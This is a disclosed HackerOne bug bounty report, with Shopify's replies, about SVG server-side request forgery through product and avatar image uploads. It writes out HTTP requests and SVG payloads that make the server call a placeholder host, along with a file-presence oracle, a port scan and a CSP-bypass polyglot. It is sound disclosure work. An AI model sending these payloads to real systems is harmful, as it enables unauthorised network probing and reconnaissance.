{"id":223203,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMjMyMDM=","url":"https://hackerone.com/reports/223203","title":"SVG Server Side Request Forgery (SSRF)","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2017-04-23T14:43:15.224Z","submitted_at":"2017-04-23T14:43:15.224Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"floyd","url":"/floyd","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/111/469/c180556a9581571521f1f7fad2da4776fc9fa9c6_original.jpeg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1382,"url":"https://hackerone.com/shopify","handle":"shopify","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Shopify","twitter_handle":"","website":"https://www.shopify.com","about":"Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-09-22T09:09:19.529Z","bug_reporter_agreed_on_going_public_at":"2017-09-22T09:09:19.442Z","team_member_agreed_on_going_public_at":"2017-07-19T13:34:36.488Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I found an issue which seems to be regression of the following issue: https://hackerone.com/reports/97501 . It seems your input validaton is not sufficient and the file is getting processed before your implemented check for valid file types.\n\nWhen adding a new product in the store, images for the product can be uploaded. When modifying the HTTP request that is sent, an attacker can do Server Side Request Forgery. The attacker simply has to specify a filename ending in .png, but use Content-Type image/svg+xml and the file content as well an SVG file.\n\nThe following requests leads to an DNS and HTTP interaction with \u003cEXAMPLE_SERVER\u003e, a placeholder for any server on the Internet:\n\n```\nPOST /admin/products/9577763394/images.json HTTP/1.1\nHost: 667667.myshopify.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:52.0) Gecko/20100101 Firefox/52.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nX-CSRF-Token: ca/m3aW88KsRSpDmudAHJrJBPrXdClc4T/D88ZltUf6E0YUeKneGI5CZtDJFo6wHg+EY+Q4h0uPU8rqnmm/Ydw==\nX-Requested-With: XMLHttpRequest\nContent-Length: 671\nContent-Type: multipart/form-data; boundary=---------------------------1184233411771235065729422741\nCookie: \u003cREDACTED\u003e\nConnection: close\n\n-----------------------------1184233411771235065729422741\nContent-Disposition: form-data; name=\"image[attachment]\"; filename=\"NagKSvgXlink2.png\"\nContent-Type: image/svg+xml\n\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?\u003e\u003csvg xmlns:svg=\"http://www.w3.org/2000/svg\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"200\" height=\"200\"\u003e\u003cimage height=\"200\" width=\"200\" xlink:href=\"http://\u003cEXAMPLE_SERVER\u003e/image.jpeg\" /\u003e\u003c/svg\u003e\n-----------------------------1184233411771235065729422741\nContent-Disposition: form-data; name=\"image[alt]\"\n\n\n-----------------------------1184233411771235065729422741--\n```\n\nAlthough the Shopify server responds with a HTTP 422 message, the interaction takes place with \u003cEXAMPLE_SERVER\u003e:\n\n```\nHTTP/1.1 422 Unprocessable Entity\nServer: nginx\nDate: Fri, 21 Apr 2017 11:17:02 GMT\nContent-Type: application/json; charset=utf-8\nConnection: close\nReferrer-Policy: origin-when-cross-origin\nX-Frame-Options: DENY\nX-ShopId: 19430493\nX-ShardId: 1\nX-Stats-UserId: 110274114\nCache-Control: no-cache, no-store\nSet-Cookie: request_method=POST; path=/\nContent-Security-Policy: default-src 'self' data: blob: 'unsafe-inline' 'unsafe-eval' https://* shopify-pos://*; child-src 'self' https://* shopify-pos://*; connect-src 'self' wss://* https://*; script-src https://cdn.shopify.com https://checkout.shopifycs.com https://js-agent.newrelic.com https://bam.nr-data.net https://dme0ih8comzn4.cloudfront.net https://api.stripe.com https://mpsnare.iesnare.com https://appcenter.intuit.com https://www.paypal.com https://stats.g.doubleclick.net https://www.google-analytics.com https://visitors.shopify.com https://v.shopify.com https://widget.intercom.io https://js.intercomcdn.com 'self' 'unsafe-inline' 'unsafe-eval'; upgrade-insecure-requests; report-uri /csp-report?source%5Baction%5D=create\u0026source%5Bapp%5D=Shopify\u0026source%5Bcontroller%5D=admin%2Fproduct_images\u0026source%5Bsection%5D=admin\u0026source%5Buuid%5D=834e8c11-d80b-4d00-a213-78619aebe696\nX-Content-Type-Options: nosniff\nX-Download-Options: noopen\nX-Permitted-Cross-Domain-Policies: none\nX-XSS-Protection: 1; mode=block; report=/xss-report?source%5Baction%5D=create\u0026source%5Bapp%5D=Shopify\u0026source%5Bcontroller%5D=admin%2Fproduct_images\u0026source%5Bsection%5D=admin\u0026source%5Buuid%5D=834e8c11-d80b-4d00-a213-78619aebe696\nX-Dc: ash,chi2\nX-Request-ID: 834e8c11-d80b-4d00-a213-78619aebe696\nContent-Length: 109\n\n{\"errors\":{\"image\":[\"The uploaded image is corrupt and cannot be processed. Please try a different image.\"]}}\n```\n\nThe interaction with \u003cEXAMPLE_SERVER\u003e for HTTP is:\n\n```\nGET /image.jpeg HTTP/1.0\nHost: \u003cEXAMPLE_SERVER\u003e\nAccept-Encoding: gzip \n```\n\nTo further analyse the issue, let's only talk about the SVG file content in the request:\n\n```\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?\u003e\n\u003csvg xmlns:svg=\"http://www.w3.org/2000/svg\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"200\" height=\"200\"\u003e\n\u003cimage height=\"200\" width=\"200\" xlink:href=\"http://\u003cEXAMPLE_SERVER\u003e/image.jpeg\" /\u003e\n\u003c/svg\u003e\n```\n\n\nA couple of facts:\n- When changing the `http://\u003cEXAMPLE_SERVER\u003e/image.jpeg` part to other protocols, only `http://` and `ftp://` lead to interaction with a server on the Internet. No other protocol on the following list does: https://www.w3.org/wiki/UriSchemes . \n- I tried to connect with the HTTP and FTP protocol to all 65535 TCP ports on my server. Shopify seems to have outbound filters on only one TCP port, 113. On all other ports I got a TCP SYN packet with both protocols. Often companies detect this kind of port scan from their network hosts, I don't know if you did.\n- The parser doesn't mind a static entity:\n\n```\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?\u003e\n\u003c!DOCTYPE testingxxe [ \u003c!ENTITY xml \"eXtensible Markup Language\"\u003e ]\u003e\n\u003csvg xmlns:svg=\"http://www.w3.org/2000/svg\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"200\" height=\"200\"\u003e\n\u003cimage height=\"30\" width=\"30\" xlink:href=\"http://\u003cEXAMPLE_SERVER\u003e/image.jpg\" /\u003e\n\u003ctext x=\"0\" y=\"20\" font-size=\"20\"\u003e\u0026xml;\u003c/text\u003e\n\u003c/svg\u003e\n```\n- The \"a billion laughs\" attack - see https://en.wikipedia.org/wiki/Billion_laughs - is probably possible as static entities are allowed, but DoS is not in the scope of your bug bounty program.\n- However, the parser *doesn't* like SYSTEM Entities, we can *not* specify a different DTD file, add SYSTEM entities or any other XXE attack.\n\nBut we can use two image references and as long as the first URL returns a valid image, the second one is requested as well:\n\n```\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?\u003e\n\u003csvg xmlns:svg=\"http://www.w3.org/2000/svg\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"200\" height=\"200\"\u003e\n\u003cimage height=\"30\" width=\"30\" xlink:href=\"http://\u003cEXAMPLE_SERVER\u003e:81/example.png\" /\u003e\n\u003cimage height=\"30\" width=\"30\" xlink:href=\"http://\u003cEXAMPLE_SERVER\u003e:999/example.png\" /\u003e\n\u003ctext x=\"0\" y=\"20\" font-size=\"20\"\u003etest\u003c/text\u003e\n\u003c/svg\u003e\n```\n\nThis results in a Is-Picture-Present-Oracle. By sending a local path first we can find out if a file that includes a picture is present on the file system. Because we get an interaction for the following SVG, we know the picture /lib/plymouth/ubuntu_logo.png is present on the system (this does *not* work with non-image files like /etc/passwd):\n\n```\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?\u003e\n\u003csvg xmlns:svg=\"http://www.w3.org/2000/svg\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"200\" height=\"200\"\u003e\n\u003cimage height=\"30\" width=\"30\" xlink:href=\"/lib/plymouth/ubuntu_logo.png\" /\u003e\n\u003cimage height=\"30\" width=\"30\" xlink:href=\"http://\u003cEXAMPLE_SERVER\u003e:999/example.png\" /\u003e\n\u003ctext x=\"0\" y=\"20\" font-size=\"20\"\u003etest\u003c/text\u003e\n\u003c/svg\u003e\n```\n\nThe following pictures allow us to fingerprint the versions of libraries installed on your server (these three files are present on your servers):\n- /usr/share/doc/libpng12-dev/examples/pngtest.png (you have libpng12-dev installed, etc.)\n- /usr/share/doc/libfreetype6/tutorial/metrics.png \n- /usr/share/doc/libexpat1-dev/expat.html/expat.png\n\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":68,"name":"Server-Side Request Forgery (SSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":64,"voters":["zzero","rootz491","m4t35z","rhynorater","sp1d3rs","drsniper","un4gi","nirvana_msu","sameerphad72","chaosbolt","and 54 more..."],"severity":{"rating":"low","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1651636,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. Our engineering team is investigating the issue.\n\n","automated_response":false,"created_at":"2017-05-03T15:20:54.175Z","updated_at":"2017-05-03T15:20:54.175Z","actor":{"username":"no-longer-with-company","cleared":false,"url":"/no-longer-with-company","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/072/324/c6fb0a069a32f1e9f503089aa18807ad593549e0_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1652142,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"As I was testing again today, I would like to add some more information to this bug report, although some of it might be separate issues, but still related to the file upload. Let me know if you want me to open a separate bug report for any of them. The following issues are all related to the image avatar upload (not the product image upload I tested before):\n\n1. The image avatar upload for profiles is also prone to the described image upload SSRF issue.\n\n2. When Uploading a file with file extension .png, content-type image/png and file content of a TIFF file, the server converts the image with GraphicsMagick. When the resulting file is downloaded again, it includes a comment in the TIFF file content. GraphicsMagick leaks the local path and the exact version of GraphicsMagick. The following string is part of the file content:\n\n/tmp/gmi7JIsA GraphicsMagick 1.4 snapshot-20160531 Q8 http://www.GraphicsMagick.org/\n\n3. Content-Type mismatch are pretty common. Uploading a tiff image content as image/png works and the response includes \"Content-Type: image/png\", but the file that is actually downloaded is a tiff image.\n\n4. A generic CSP bypass is possible as https://cdn.shopify.com is whitelisted in the CSP header and it is possible to upload a file that is a valid GIF image and a valid JavaScript. Such a file is described on http://www.thinkfu.com/blog/gifjavascript-polyglots . I succesfully uploaded that file and although GraphicsMagick will transform it, it stays a valid GIF image and JavaScript file. The file on the CDN domain can be found here: https://cdn.shopify.com/s/files/1/1943/0493/users/1DwldMePolyGifCspBypass0aLr.gif?v=1493836174\n","automated_response":false,"created_at":"2017-05-03T18:43:36.002Z","updated_at":"2017-05-03T18:43:36.002Z","actor":{"username":"floyd","cleared":false,"url":"/floyd","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/111/469/c180556a9581571521f1f7fad2da4776fc9fa9c6_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1755882,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Any updates on this one?","automated_response":false,"created_at":"2017-06-14T17:34:51.964Z","updated_at":"2017-06-14T17:34:51.964Z","actor":{"username":"floyd","cleared":false,"url":"/floyd","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/111/469/c180556a9581571521f1f7fad2da4776fc9fa9c6_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1777827,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you again for your report! We have recently deployed a fix for this issue.\n\nOur next round of bounty decisions will take place next week, so we will be in touch with you again soon.","automated_response":false,"created_at":"2017-06-23T21:21:30.232Z","updated_at":"2017-06-23T21:21:30.232Z","actor":{"username":"no-longer-with-company","cleared":false,"url":"/no-longer-with-company","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/072/324/c6fb0a069a32f1e9f503089aa18807ad593549e0_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"floyd","url":"/floyd"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1784399,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2017-06-27T13:51:41.907Z","updated_at":"2017-06-27T13:51:41.907Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Shopify"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"floyd","url":"/floyd"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1784400,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @floyd, thanks for reporting this issue. We've fixed the issue by adding a mime type validation before parsing an image with graphicks magic. We're awarding 500$ since this is consistent with how we rewarded similar issues in the past.","automated_response":false,"created_at":"2017-06-27T13:51:55.288Z","updated_at":"2017-06-27T13:51:55.288Z","actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1802573,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the bug bounty. I can confirm the issue is fixed.","automated_response":false,"created_at":"2017-07-04T19:36:17.930Z","updated_at":"2017-07-04T19:36:17.930Z","actor":{"username":"floyd","cleared":false,"url":"/floyd","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/111/469/c180556a9581571521f1f7fad2da4776fc9fa9c6_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1849722,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-07-19T13:34:36.504Z","updated_at":"2017-07-19T13:34:36.504Z","first_to_agree":true,"actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2013732,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-09-22T09:09:19.472Z","updated_at":"2017-09-22T09:09:19.472Z","actor":{"username":"floyd","cleared":false,"url":"/floyd","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/111/469/c180556a9581571521f1f7fad2da4776fc9fa9c6_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2013733,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-09-22T09:09:19.550Z","updated_at":"2017-09-22T09:09:19.550Z","actor":{"username":"floyd","cleared":false,"url":"/floyd","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/111/469/c180556a9581571521f1f7fad2da4776fc9fa9c6_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}